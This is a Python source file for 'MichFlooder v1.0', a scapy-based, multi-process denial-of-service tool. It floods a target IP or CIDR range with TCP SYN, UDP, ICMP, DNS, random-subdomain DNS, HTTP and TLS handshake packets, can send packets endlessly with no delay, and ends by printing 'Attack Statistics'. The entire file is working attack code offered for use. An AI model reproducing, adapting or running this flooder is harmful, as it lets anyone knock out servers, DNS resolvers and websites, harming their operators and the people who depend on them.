from random import choices
from datetime import timedelta
from os import urandom, cpu_count
from string import ascii_lowercase
from argparse import ArgumentParser
from multiprocessing import Process
from time import strftime, localtime, time

from scapy.packet import Raw
from scapy.sendrecv import send
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.volatile import RandInt, RandShort, RandChoice, RandIP, RandField

class RandSubDomainDNS(RandField):
    def __init__(self, domain):
        super(RandSubDomainDNS, self).__init__()
        self.domain = domain
        self.dnsqr = DNSQR()

    def _fix(self):
        subdomain = "".join(choices(ascii_lowercase, k=5))
        self.dnsqr.qname = f"{subdomain}.{self.domain}"
        return self.dnsqr

class RandSubDomainHTTP(RandField):
    def __init__(self, domain):
        super(RandSubDomainHTTP, self).__init__()
        self.domain = domain
        self.start = f"GET / HTTP/1.1\r\nHost: "
        self.end="\r\nUser-Agent: MichFlooder\r\nConnection: close\r\n\r\n"

    def _fix(self):
        subdomain = "".join(choices(ascii_lowercase, k=5))
        return self.start + f"{subdomain}.{self.domain}" + self.end

class HashableRandIP(RandIP):
    def __hash__(self):
        return hash(self.ip)

def now():
    return strftime("%H:%M:%S", localtime())

l4generators = {
    "tcp":  lambda dports: TCP(sport=RandShort(), dport=RandChoice(*dports), flags="S", seq=RandInt()),
    "udp":  lambda dports: UDP(sport=RandShort(), dport=RandChoice(*dports)),
    "icmp": lambda _: ICMP(id=RandShort(), seq=RandShort())
}

l7generators = {
    "dns": lambda domain: DNS(id=RandShort(), rd=1, qd=DNSQR(qname=domain)),
    "rand_dns": lambda domain: DNS(id=RandShort(), rd=1, qd=RandSubDomainDNS(domain)),
    "http": lambda domain: Raw(load=
        f"GET / HTTP/1.1\r\n" +
        f"Host: {domain}\r\n" if domain else "" +
        f"User-Agent: MichFlooder\r\n" +
        f"Connection: close\r\n\r\n"),
    "rand_http": lambda domain: Raw(load=RandSubDomainHTTP(domain)),
    "https": lambda _: Raw(load=
        b"\x16\x03\x01\x00\x2e\x01\x00\x00\x2a\x03\x03" +
        urandom(32) + b"\x00\x00\x02\x00\x3c\x01\x00\x00\x00"
    )
}

def send_packets(thread_num, target, ports, protocol, domain, size, interval, count):
    print(f"[{now()}] Thread #{thread_num} started...", flush=True)
    packet = gen_packet(target, ports, protocol, domain, size, count)
    send(packet, verbose=False, inter=interval)
    print(f"[{now()}] Thread #{thread_num} sent {count} packets.", flush=True)

def parse_ports(port_str):
    ports = set()
    for part in port_str.split(','):
        if '-' in part:
            start, *_, end = part.split('-')
            start = int(start) if start else 1
            end = int(end) if end else 65535
            ports.update(range(start, end + 1))
        else:
            ports.add(int(part))
    return ports

def parse_args():
    parser = ArgumentParser()

    parser.add_argument("target", help="Target IP/CIDR (e.g. 192.168.1.0/24)")

    parser.add_argument("-p", "--port", help="Target port(s), Nmap style: 80,443 or 20-25")
    parser.add_argument("-n", "--count", type=int, help="Number of packets to send (default: infinite)")
    parser.add_argument("-s", "--size", type=int, default=0, help="Packet size in bytes (max: 1450)")
    parser.add_argument("-t", "--threads", type=int, default=cpu_count(), help="Number of threads (default: all)")
    parser.add_argument("-i", "--interval", type=float, default=0, help="Interval between packets in seconds (e.g. 0.1) (default: 0)")
    parser.add_argument("-d", "--domain", help="Domain to query (Must for dns, optional for http)")
    parser.add_argument("-r", "--rand-domain", action="store_true", help="Randomize subdomain (5-letter lowercase) of given domain.")
    parser.add_argument("-y", "--accept", action="store_true", help="Immediately start, dont ask.")

    proto_group = parser.add_argument_group("Protocol", "Choose one of the following protocols to use", argument_default="icmp")
    protocol = proto_group.add_mutually_exclusive_group()
    protocol.add_argument("-P", "--ICMP", "--PING", action="store_const", const="icmp", dest="protocol", help="Use ICMP (Ping) (default)")
    protocol.add_argument("-T", "--TCP",   action="store_const", const="tcp",   dest="protocol", help="Use TCP SYN")
    protocol.add_argument("-U", "--UDP",   action="store_const", const="udp",   dest="protocol", help="Use UDP")
    protocol.add_argument("-D", "--DNS",   action="store_const", const="dns",   dest="protocol", help="Use DNS over UDP")
    protocol.add_argument("-H", "--HTTP",  action="store_const", const="http",  dest="protocol", help="Use HTTP over TCP")
    protocol.add_argument("-S", "--HTTPS", action="store_const", const="https", dest="protocol", help="Use HTTP over TCP")

    args = parser.parse_args()

    if args.size > 1450:
        parser.error("Min packet size cannot exceed 1450 bytes.")

    if args.count and args.threads > args.count:
        args.threads = args.count

    if not args.port:
        if args.protocol == "dns":
            args.port = "53"
        elif args.protocol == "http":
            args.port = "80"
        elif args.protocol == "https":
            args.port = "443"
        elif args.protocol != "icmp":
            parser.error("TCP/UDP requires --port.")
    elif args.protocol == "icmp" and args.port != "0":
        parser.error("--port (-p) not allowed with ICMP.")

    ports = parse_ports(args.port) if args.port else {}
    if any(port > 65535 for port in ports):
        parser.error("Ports cannot exceed 65535")

    if args.domain:
        if args.protocol in ["dns", "http"]:
            args.protocol = f"rand_{args.protocol}"
        elif args.rand_domain:
            parser.error("-d (--domain) requires DNS/HTTP.")
    else:
        if args.protocol == "dns":
            parser.error(f"DNS requires --domain.")
        if args.rand_domain:
            parser.error("-r (--rand-domain) requires --domain.")

    return args, ports

def get_generators(protocol):
    return {
        "tcp" : (l4generators["tcp"], None),
        "udp" : (l4generators["udp"], None),
        "icmp" : (l4generators["icmp"], None),
        "dns" : (l4generators["udp"], l7generators["dns"]),
        "http" : (l4generators["tcp"], l7generators["http"]),
        "rand_dns" : (l4generators["udp"], l7generators["rand_dns"]),
        "rand_http" : (l4generators["tcp"], l7generators["rand_http"]),
        "https" : (l4generators["tcp"], l7generators["https"])
    }.get(protocol)

def gen_packet(destination_ips, ports, protocol, domain, min_size, count):
    l4func, l7func = get_generators(protocol)
    ip_layer = IP(dst=HashableRandIP(destination_ips))
    l4_layer = l4func(ports)
    l7_layer = l7func(domain) if l7func else Raw()
    packet_size = len(ip_layer / l4_layer / l7_layer)
    payload_size = max(0, min_size - packet_size)
    payload = Raw(load=payload_size)
    if count:
        for i in range(count):
            yield ip_layer / l4_layer / l7_layer / payload
    else:
        while True:
            yield ip_layer / l4_layer / l7_layer / payload

def print_stats(start_time, packet_count, threads, packet_size):
    end_time = time()
    start_str = strftime('%H:%M:%S', localtime(start_time))
    end_str = strftime('%H:%M:%S', localtime(end_time))
    elapsed_time = end_time - start_time
    elapsed_time_str = str(timedelta(seconds=int(elapsed_time)))

    print("\n===== Attack Statistics =====")
    print(f"Start Time   : {start_str}")
    print(f"End Time     : {end_str}")
    print(f"Time Taken   : {elapsed_time_str}")

    if packet_count:
        packets_sent = packet_count * threads
        total_MB = (packet_size * packets_sent) / (1024 ** 2)
        print(f"Packets Sent : {packets_sent:,}")
        print(f"Total Volume : {total_MB:.2f} MB")
        print(f"Avg          : {total_MB / elapsed_time:,.2f} MB/s")
        print(f"               {packets_sent / elapsed_time:,.2f} PPS")

def main():
    print("\n======================")
    print("==                  ==")
    print("== MichFlooder v1.0 ==")
    print("==  By MichelCohen  ==")
    print("==                  ==")
    print("======================\n")

    args, ports = parse_args()
    print('\n'.join(f"{k:<9} = {v}" for k, v in vars(args).items() if v))

    packet_count = args.count // args.threads if args.count else None

    if not args.accept:
        input(f"Press Enter to start sending...")
    print(f"\n[{now()}] Sending packets...\n")
    start_time = time()

    processes = []
    for thread_num in range(args.threads):
        process = Process(
            target=send_packets,
            args=(thread_num, args.target, ports, args.protocol, args.domain, args.size, args.interval*args.threads, packet_count)
        )
        process.start()
        processes.append(process)

    try:
        for process in processes:
            process.join()
    except KeyboardInterrupt:
        print("\n[!] Ctrl+C detected! Terminating...")
        for process in processes:
            process.terminate()
        for process in processes:
            process.join()

    packet_size = len(next(gen_packet(args.target, ports, args.protocol, args.domain, args.size, 1)))
    print_stats(start_time, packet_count, args.threads, packet_size)

if __name__ == "__main__":
    main()
